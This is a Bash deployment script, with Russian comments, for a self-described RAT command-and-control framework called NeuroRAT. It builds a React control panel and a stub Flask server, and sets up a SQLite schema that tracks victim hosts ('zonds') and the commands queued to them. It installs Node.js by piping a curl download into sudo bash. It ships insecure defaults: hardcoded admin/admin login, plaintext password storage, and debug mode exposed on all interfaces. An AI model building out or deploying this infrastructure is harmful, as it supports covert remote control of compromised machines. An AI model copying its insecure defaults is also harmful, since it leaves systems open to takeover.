#!/bin/bash
# NeuroRAT C2 Framework - Скрипт развертывания
# Автор: iamtomasanderson@gmail.com
# GitHub: https://github.com/Personaz1

set -e

echo "██╗  ██╗███████╗██╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ████████╗"
echo "███╗ ██║██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝"
echo "█╔██╗██║█████╗  ██║   ██║██████╔╝██║   ██║██████╔╝███████║   ██║   "
echo "██╔██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══██╗██╔══██║   ██║   "
echo "██║╚████║███████╗╚██████╔╝██║  ██║╚██████╔╝██║  ██║██║  ██║   ██║   "
echo "╚═╝ ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   "
echo "Установка C2 Framework начата..."

# Создание необходимых директорий, если они не существуют
mkdir -p admin-panel-new
mkdir -p agent_modules
mkdir -p logs
mkdir -p neurorat-ui
mkdir -p certs

# Проверка наличия Python
if ! command -v python3 &> /dev/null; then
    echo "Python3 не найден. Установка..."
    sudo apt-get update
    sudo apt-get install -y python3 python3-pip python3-venv
fi

# Проверка наличия Node.js для admin-panel-new
if ! command -v node &> /dev/null; then
    echo "Node.js не найден. Установка..."
    curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
    sudo apt-get install -y nodejs
fi

# Создание виртуального окружения Python
echo "Создание виртуального окружения Python..."
python3 -m venv venv
source venv/bin/activate

# Установка зависимостей Python
echo "Установка зависимостей Python..."
pip install --upgrade pip
pip install -r requirements.txt

# Проверка существования директории admin-panel-new
if [ -d "admin-panel-new" ]; then
    # Установка зависимостей для admin-panel-new
    echo "Установка зависимостей для панели администратора..."
    cd admin-panel-new
    
    # Создание базовых файлов, если их нет
    if [ ! -f "package.json" ]; then
        echo "Создание package.json..."
        cat > package.json << EOL
{
  "name": "admin-panel-new",
  "private": true,
  "version": "0.0.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "tsc -b && vite build",
    "lint": "eslint . --ext ts,tsx --report-unused-disable-directives --max-warnings 0",
    "preview": "vite preview"
  },
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-router-dom": "^6.15.0",
    "@chakra-ui/react": "^2.8.0",
    "@chakra-ui/icons": "^2.1.0",
    "@emotion/react": "^11.11.1",
    "@emotion/styled": "^11.11.0",
    "framer-motion": "^10.15.0",
    "@reduxjs/toolkit": "^1.9.5",
    "react-redux": "^8.1.2",
    "axios": "^1.4.0",
    "chart.js": "^4.3.3",
    "react-chartjs-2": "^5.2.0"
  },
  "devDependencies": {
    "@types/react": "^18.2.15",
    "@types/react-dom": "^18.2.7",
    "@typescript-eslint/eslint-plugin": "^6.0.0",
    "@typescript-eslint/parser": "^6.0.0",
    "@vitejs/plugin-react": "^4.0.3",
    "eslint": "^8.45.0",
    "eslint-plugin-react-hooks": "^4.6.0",
    "eslint-plugin-react-refresh": "^0.4.3",
    "typescript": "^5.0.2",
    "vite": "^4.4.5"
  }
}
EOL
    fi
    
    # Создание index.html, если его нет
    if [ ! -f "index.html" ]; then
        echo "Создание index.html..."
        mkdir -p public
        cat > index.html << EOL
<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>NeuroRAT C2 - Панель управления</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
EOL
    fi
    
    # Создание структуры директорий для src, если её нет
    mkdir -p src
    
    npm install
    npm run build
    cd ..
else
    echo "Директория admin-panel-new не найдена! Создание..."
    mkdir -p admin-panel-new/src
    mkdir -p admin-panel-new/public
    
    # Создание базового файла index.html
    cat > admin-panel-new/index.html << EOL
<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>NeuroRAT C2 - Панель управления</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
EOL
    
    # Создание минимального package.json
    cat > admin-panel-new/package.json << EOL
{
  "name": "admin-panel-new",
  "private": true,
  "version": "0.0.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "tsc -b && vite build",
    "lint": "eslint . --ext ts,tsx --report-unused-disable-directives --max-warnings 0",
    "preview": "vite preview"
  },
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-router-dom": "^6.15.0",
    "@chakra-ui/react": "^2.8.0",
    "@chakra-ui/icons": "^2.1.0",
    "@emotion/react": "^11.11.1",
    "@emotion/styled": "^11.11.0",
    "framer-motion": "^10.15.0",
    "@reduxjs/toolkit": "^1.9.5",
    "react-redux": "^8.1.2",
    "axios": "^1.4.0"
  },
  "devDependencies": {
    "@types/react": "^18.2.15",
    "@types/react-dom": "^18.2.7",
    "@typescript-eslint/eslint-plugin": "^6.0.0",
    "@typescript-eslint/parser": "^6.0.0",
    "@vitejs/plugin-react": "^4.0.3",
    "eslint": "^8.45.0",
    "eslint-plugin-react-hooks": "^4.6.0",
    "eslint-plugin-react-refresh": "^0.4.3",
    "typescript": "^5.0.2",
    "vite": "^4.4.5"
  }
}
EOL
    
    # Создание базового основного файла
    mkdir -p admin-panel-new/src
    cat > admin-panel-new/src/main.tsx << EOL
import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App.tsx'
import './index.css'

ReactDOM.createRoot(document.getElementById('root')!).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>,
)
EOL
    
    # Создание базового App компонента
    cat > admin-panel-new/src/App.tsx << EOL
import { useState } from 'react'
import './App.css'

function App() {
  const [count, setCount] = useState(0)

  return (
    <>
      <div>
        <h1>NeuroRAT C2 - Панель управления</h1>
        <div>
          <button onClick={() => setCount((count) => count + 1)}>
            Счетчик: {count}
          </button>
        </div>
      </div>
    </>
  )
}

export default App
EOL
    
    # Создание базовых CSS файлов
    cat > admin-panel-new/src/index.css << EOL
:root {
  font-family: Inter, system-ui, Avenir, Helvetica, Arial, sans-serif;
  line-height: 1.5;
  font-weight: 400;
}

body {
  margin: 0;
  display: flex;
  place-items: center;
  min-width: 320px;
  min-height: 100vh;
}

h1 {
  font-size: 3.2em;
  line-height: 1.1;
}

button {
  border-radius: 8px;
  border: 1px solid transparent;
  padding: 0.6em 1.2em;
  font-size: 1em;
  font-weight: 500;
  font-family: inherit;
  background-color: #1a1a1a;
  cursor: pointer;
  transition: border-color 0.25s;
}
button:hover {
  border-color: #646cff;
}
button:focus,
button:focus-visible {
  outline: 4px auto -webkit-focus-ring-color;
}
EOL
    
    cat > admin-panel-new/src/App.css << EOL
#root {
  max-width: 1280px;
  margin: 0 auto;
  padding: 2rem;
  text-align: center;
}
EOL
    
    # Создание tsconfig.json
    cat > admin-panel-new/tsconfig.json << EOL
{
  "compilerOptions": {
    "target": "ES2020",
    "useDefineForClassFields": true,
    "lib": ["ES2020", "DOM", "DOM.Iterable"],
    "module": "ESNext",
    "skipLibCheck": true,
    "moduleResolution": "bundler",
    "allowImportingTsExtensions": true,
    "resolveJsonModule": true,
    "isolatedModules": true,
    "noEmit": true,
    "jsx": "react-jsx",
    "strict": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "noFallthroughCasesInSwitch": true
  },
  "include": ["src"],
  "references": [{ "path": "./tsconfig.node.json" }]
}
EOL
    
    # Создание tsconfig.node.json
    cat > admin-panel-new/tsconfig.node.json << EOL
{
  "compilerOptions": {
    "composite": true,
    "skipLibCheck": true,
    "module": "ESNext",
    "moduleResolution": "bundler",
    "allowSyntheticDefaultImports": true
  },
  "include": ["vite.config.ts"]
}
EOL
    
    # Создание vite.config.ts
    cat > admin-panel-new/vite.config.ts << EOL
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

// https://vitejs.dev/config/
export default defineConfig({
  plugins: [react()],
})
EOL
    
    # Установка зависимостей и сборка
    cd admin-panel-new
    npm install
    npm run build
    cd ..
fi

# Настройка конфигурации
echo "Настройка конфигурации..."
if [ ! -f ".env" ]; then
    echo "Создание файла .env с настройками по умолчанию..."
    cat > .env <<EOL
SERVER_HOST=0.0.0.0
SERVER_PORT=8443
SECRET_KEY=$(openssl rand -hex 32)
DEBUG=False
DATABASE_URL=sqlite:///neurorat.db
ADMIN_USERNAME=admin
ADMIN_PASSWORD=$(openssl rand -hex 8)
TELEGRAM_BOT_TOKEN=
SSL_CERT=./certs/cert.pem
SSL_KEY=./certs/key.pem
EOL
    echo "ВНИМАНИЕ: Сгенерирован случайный пароль администратора. Проверьте файл .env!"
fi

# Создание самоподписанного SSL-сертификата, если его нет
if [ ! -d "certs" ]; then
    echo "Создание самоподписанных SSL-сертификатов..."
    mkdir -p certs
    
    # Проверяем, установлен ли openssl
    if command -v openssl &> /dev/null; then
        openssl req -x509 -newkey rsa:4096 -nodes -out certs/cert.pem -keyout certs/key.pem -days 365 -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
    else
        echo "OpenSSL не установлен. Создание dummy-сертификатов..."
        # Создаем пустые файлы сертификатов
        touch certs/cert.pem
        touch certs/key.pem
    fi
fi

# Создание заглушки для server.py, если его нет
if [ ! -f "server.py" ]; then
    echo "Создание заглушки для server.py..."
    cat > server.py << EOL
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import logging
from flask import Flask, render_template, request, jsonify

# Настройка логирования
if not os.path.exists('logs'):
    os.makedirs('logs')
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/server.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder='admin-panel-new/dist', static_url_path='/')

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/api/status')
def status():
    return jsonify({'status': 'ok', 'version': '1.0.0'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    # Заглушка для аутентификации
    if username == 'admin' and password == 'admin':
        return jsonify({'status': 'success', 'token': 'dummy_token'})
    return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 401

if __name__ == '__main__':
    logger.info("Starting server...")
    app.run(host='0.0.0.0', port=8080, debug=True)
EOL
    chmod +x server.py
fi

# Создание setup_database.py, если его нет
if [ ! -f "setup_database.py" ]; then
    echo "Создание setup_database.py..."
    cat > setup_database.py << EOL
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sqlite3
import logging

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Путь к базе данных
DB_PATH = 'neurorat.db'

def setup_database():
    """Инициализация базы данных со всеми необходимыми таблицами"""
    logger.info("Инициализация базы данных...")
    
    # Проверка, существует ли база данных
    if os.path.exists(DB_PATH):
        logger.info(f"База данных {DB_PATH} уже существует")
        return
    
    # Создание соединения с базой данных
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Создание таблиц
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        email TEXT,
        role TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS zonds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        zond_id TEXT UNIQUE NOT NULL,
        name TEXT,
        status TEXT,
        ip_address TEXT,
        os TEXT,
        last_seen TIMESTAMP,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS tasks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        task_id TEXT UNIQUE NOT NULL,
        zond_id TEXT,
        command TEXT,
        status TEXT,
        result TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        completed_at TIMESTAMP,
        FOREIGN KEY (zond_id) REFERENCES zonds (zond_id)
    )
    ''')
    
    # Создание начального пользователя admin
    cursor.execute('''
    INSERT INTO users (username, password, role)
    VALUES (?, ?, ?)
    ''', ('admin', 'admin', 'admin'))
    
    # Применение изменений и закрытие соединения
    conn.commit()
    conn.close()
    
    logger.info("База данных успешно инициализирована")

if __name__ == '__main__':
    setup_database()
EOL
    chmod +x setup_database.py
fi

# Создание базового файла .gitignore
if [ ! -f ".gitignore" ]; then
    echo "Создание .gitignore..."
    cat > .gitignore << EOL
# Python
__pycache__/
*.py[cod]
*$py.class
*.so
.Python
env/
build/
develop-eggs/
dist/
downloads/
eggs/
.eggs/
lib/
lib64/
parts/
sdist/
var/
*.egg-info/
.installed.cfg
*.egg
venv/
.venv/

# Node.js
node_modules/
npm-debug.log
yarn-debug.log
yarn-error.log
.pnpm-debug.log

# Logs
logs/
*.log

# Environment variables
.env

# Database
*.db
*.sqlite
*.sqlite3

# IDE
.idea/
.vscode/
*.swp
*.swo

# MacOS
.DS_Store
.AppleDouble
.LSOverride

# Windows
Thumbs.db
ehthumbs.db
Desktop.ini

# Dist
admin-panel-new/dist/
EOL
fi

# Инициализация базы данных
echo "Инициализация базы данных..."
python3 setup_database.py

# Настройка прав доступа
echo "Настройка прав доступа..."
chmod +x start.sh
chmod +x server.py
chmod +x setup_database.py

echo "Развертывание NeuroRAT C2 Framework завершено!"
echo "Для запуска сервера выполните: ./start.sh"
echo "Информация для входа в панель администратора:"
echo "URL: http://$(hostname -I | awk '{print $1}'):8080/admin"
echo "Логин: admin"
echo "Пароль: admin (по умолчанию) или $(grep ADMIN_PASSWORD .env | cut -d= -f2 2>/dev/null || echo 'проверьте в .env')"